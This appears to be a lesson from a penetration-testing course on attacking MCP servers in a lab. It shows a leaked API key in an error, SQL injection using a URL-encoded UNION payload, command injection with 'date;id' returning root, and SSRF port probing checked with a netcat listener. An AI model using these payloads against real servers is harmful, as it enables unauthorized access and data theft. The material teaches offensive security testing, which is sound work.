# Vulnerable MCP Servers

Since MCP servers often provide functionality related to data retrieval and system access, common security vulnerabilities such as`injection vulnerabilities`can occur. Security issues may arise if resources or tools do not validate or sanitize arguments properly. In particular, remember that MCP servers operate independently from the LLM integration. Therefore, resources and tools can not only be accessed by LLMs but also by anyone with network access to the MCP server. Thus, malicious actors may be able to manually exploit security vulnerabilities in server capabilities, without the need to orchestrate an LLM to transmit exploit payloads, which would require additional effort to bypass built-in LLM resilience via exploit techniques such as`jailbreaking`. Maintainers of the MCP server code may falsely believe that MCP clients can be trusted due to their LLM integration. However, since anyone with network access to the MCP server can directly interact with the server's capabilities, identifying and exploiting security flaws within these capabilities can be a straightforward task for skilled adversaries.

This section will focus on security vulnerabilities in resources and tools. As such, let us create a basic MCP client to print all available resources and tools using the functions discussed in the previous section:

Code:python```
`importasynciofromfastmcpimportClient,FastMCP

client=Client("http://172.17.0.2:8000/mcp/")asyncdefmain():asyncwithclient:resources=awaitclient.list_resources()resource_templates=awaitclient.list_resource_templates()tools=awaitclient.list_tools()print("Resources:")forresourceinresources:print('***')print(resource.name)print(resource.description.strip())print("-"*50)print("Resource Templates:")forresource_templateinresource_templates:print('***')print(resource_template.uriTemplate)print(resource_template.description.strip())print("-"*50)print("Tools:")fortoolintools:print('***')params=list(tool.inputSchema.get('properties').keys())print(f"{tool.name}({','.join(params)})")print(tool.description.strip())asyncio.run(main())`
```

We will discuss common security vulnerabilities in MCP server implementations as an example. Remember that MCP server implementations are not restricted to the security vulnerabilities explored in this section.

---

## Sensitive Information Disclosure

Since MCP servers interact with external systems, they often store and process sensitive information such as credentials, access tokens, or API keys. If this information is accidentally leaked to MCP clients, unauthorized adversaries may be able to gain access to third-party systems, impersonate users, and even fully take control of services.

Vulnerable MCP servers may disclose sensitive information in tool and resource responses. Thus, we should carefully evaluate all provided capabilities when assessing the security of an MCP server. In particular, a lack of exception handling may result in sensitive information being disclosed in stack traces or verbose error messages returned in an MCP error response. Therefore, we should focus on attempting to provoke errors within the MCP server capabilities to check for sensitive information disclosure.

For instance, let us assume an MCP server provides the following resources and resource templates:

- `resource://logs`: Provide the MCP server logs.
- `resource://items`: Fetch all available items.
- `quantity://{item}`: Fetch item quantity from quantity API.
Since the server logs may contain sensitive information, this resource appears to be of interest. When we access it, we see it contains additional information for specific errors. Furthermore, we can deduce that`banana`and`apple`are valid items:

Code:bash```
`2025-05-1214:56:59.941202: MCP server starting...2025-05-1214:57:00.183027: Startup complete.2025-05-1214:58:38.832220: Getting priceforitem'banana'2025-05-1214:58:57.657254: Executing servercommand'date'2025-05-1214:58:57.660863: Getting priceforitem'banana'2025-05-1214:59:15.738618: Executing servercommand'uptime'2025-05-1214:59:15.741989: Getting priceforitem'apple'2025-05-1214:59:42.669495: Executing servercommand'whoami'2025-05-1215:02:48.047280: Error fetching item quantityforitem'watremelon':'NoneType'object is not subscriptable2025-05-13 08:48:54.519100: Getting all items2025-05-13 08:48:59.157551: Getting all items`
```

Let us move on to the`quantity`resource. From the description, we can deduce that it interacts with a web API. We can fetch the quantity by adjusting our MCP client:

Code:python```
`try:result_object=awaitclient.read_resource("quantity://banana")print(result_object[0].text)exceptExceptionase:print(f"[-]{e}")`
```

Since the resource interacts with an external system, let us try to provoke an error and see how the MCP server reacts. The first way to try would be to request an invalid item, such as`asd!`. After running the updated client code, we get the following result:

Code:bash```
`[-]Error creating resource from template: Error creating resource from template: Quantity API Error: Requests details:'http://quantityapi.local/api/item/asd!'{'Content-Type':'application/json','User-Agent':'MCP Server 1.0.0','X-Api-Key':'7f1db571858da4cf0af43645812e1997'}`
```

As we can see, the verbose error message contains information about the HTTP request that caused an error, including an API key. We can potentially use this API key to gain unauthorized access to the API. Sometimes, MCP servers may handle errors properly and only display generic error messages, but write sensitive information to the server logs.

---

## Broken Authorization

If an MCP server provides functionality for different access scopes, security vulnerabilities related to broken authorization, such as`Insecure Direct Object Reference (IDOR)`, may arise. For example, let us assume an MCP server provides the following resource:

- `document://{doc_id}`: Retrieve a document from cloud storage by its id.
This resource enables users to integrate their LLM application with documents stored in a cloud service. If the MCP server fails to correctly verify authorization for the client, an MCP client may be able to access other users' documents by providing the respective document ID.

While there certainly are broken authorization vulnerabilities in MCP servers, compared to other security vulnerabilities discussed in this section, they are likely rarer. That is because an MCP server itself needs to be authorized to access the data the user intends to access. The MCP server's access scope is often defined by an access token or API key provided in the server's code. If there are no broken authorization vulnerabilities in the external service the MCP server interacts with, authorization is often enforced by the access scope tied to the MCP server's access token or API key. Thus, the MCP server itself may not need to implement authorization checks.

---

## Injection Vulnerabilities

Injection vulnerabilities are one of the most common security issues in any software. MCP servers are no exception. They must treat incoming data via parameters as untrusted data and apply proper validation and sanitization before usage. Let us explore the common security vulnerabilities,`SQL injection`and`Command injection`, in an MCP server providing the following capabilities:

- `price://{item}`: Fetch item price from price API.
- `execute_server_command(command)`: Execute a safe command on the server. The command is limited to 'date', 'whoami', and 'uptime'.
#### SQL Injection

We can call the price of an item from our MCP client implementation like so:

Code:python```
`try:result_object=awaitclient.read_resource("price://banana")print(result_object[0].text)exceptExceptionase:print(f"[-]{e}")`
```

The resource description states that the data is fetched from an API. However, the API most likely retrieves the information from a database. As such, we could probe for an SQL injection vulnerability by injecting a single quote. Doing so results in an error message:

Code:bash```
`[-]Error creating resource from template: Error creating resource from template: Price API Error`
```

Let us try to confirm the SQL injection vulnerability by adding a SQL comment to the end of the query using a payload like`price://banana'--`. The MCP server returns the price for a banana, confirming the vulnerability.

In order to exploit it, let us attempt to exfiltrate additional data from the database. However, supplying a simple UNION-based payload results in an error message:

Code:bash```
`[-]1validation errorforfunction-wrap[wrap_val()]Input should be a valid URL, invalid domain character[type=url_parsing,input_value="price://x' UNION SELECT 1--",input_type=str]For further information visit https://errors.pydantic.dev/2.11/v/url_parsing`
```

The supplied URL is invalid as it contains spaces, which are not allowed. Furthermore, the URL cannot contain slashes, so we cannot use SQL comments`/**/`instead of spaces. However, remember that the description states that the MCP server interacts with a web API, rather than a database directly. As such, we may be able to supply a URL-encoded payload to bypass these restrictions. We can use`%20`to URL-encode spaces, resulting in the URI`price://x'%20UNION%20SELECT%201--`. When reading this resource, the MCP server responds with our injected`1`, confirming the UNION-based SQL injection vulnerability and enabling us to exfiltrate the entire database. For more details on SQL injection vulnerabilities, check out the[SQL Injection Fundamentals](https://enterprise.hackthebox.com/academy-lab/67497/preview/modules/33)module.

#### Command Injection

MCP servers may provide tools to execute system commands. If there is a lack of proper input validation, implementations may be vulnerable to command injection, which enables adversaries to execute arbitrary system commands. For instance, we can call the tool`execute_server_command`with the following code snippet:

Code:python```
`try:result_object=awaitclient.call_tool("execute_server_command",{"command":"date"})print(result_object[0].text)exceptExceptionase:print(f"[-]{e}")`
```

If we attempt to execute a command that is not whitelisted, the MCP server responds with an error message:`[-] Error executing tool execute_server_command: Invalid Command`. We can try common command injection payloads such as`;`,`|`, or`&&`and supply a command like`date;id`, enabling us to execute arbitrary system commands:

Code:bash```
`Tue May1309:56:30 UTC2025uid=0(root)gid=0(root)groups=0(root)`
```

For more details on command injections, check out the[Command Injections](https://enterprise.hackthebox.com/academy-lab/67497/preview/modules/109)module.

---

## Server-side Request Forgery (SSRF)

If an MCP server provides functionality to fetch additional resources from external systems without properly sanitizing the URL,`Server-side Request Forgery (SSRF)`vulnerabilities may arise. For instance, consider an MCP server that provides the following tool to fetch data from external systems:

- `fetch_price_data(url)`: Fetch price data from an external URL.
To confirm that we can supply arbitrary URLs, we can call the tool with a URL pointing to a system under our control and catch the request using a`netcat listener`:

```
icantthinkofaname23@htb[/htb]`$nc-lnvp8000listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 39604
GET /ssrf HTTP/1.1
Host: 172.17.0.1:8000
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive`
```

We can use the SSRF vulnerability to potentially access resources in the MCP server's internal network. For instance, we can determine if internal ports on the MCP server system are open or closed. Providing a URL such as`http://127.0.0.1:80`results in the successful response`Success`, indicating that port 80 is open, while providing a URL such as`http://127.0.0.1:22`results in an error response, indicating that the port is closed:`Failed to establish a new connection: [Errno 111] Connection refused`.